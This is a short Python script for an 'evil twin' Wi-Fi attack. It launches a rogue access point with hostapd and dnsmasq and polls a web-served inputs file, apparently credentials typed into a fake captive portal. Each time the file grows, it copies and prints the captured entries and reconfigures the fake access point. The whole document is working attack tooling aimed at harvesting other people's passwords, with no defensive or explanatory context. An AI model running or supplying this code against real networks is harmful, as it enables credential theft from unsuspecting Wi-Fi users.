import os
from sys import argv
from time import sleep
from conf import fake_ap_reconfiguration

if __name__ == '__main__': 
    iface = argv[1]
    # raise the evil twin network
    os.system('hostapd ./conf/hostapd.conf -B')
    os.system('dnsmasq -C ./conf/dnsmasq.conf')
    while True:
        curr_size = os.path.getsize('/var/www/html/inputs.txt')
        
        while os.path.getsize('/var/www/html/inputs.txt') == curr_size:
            sleep(1)
        os.system('cat /var/www/html/inputs.txt > ./inputs.txt')
        os.system('echo saved inputs:')
        os.system('cat ./inputs.txt')
        fake_ap_reconfiguration(iface)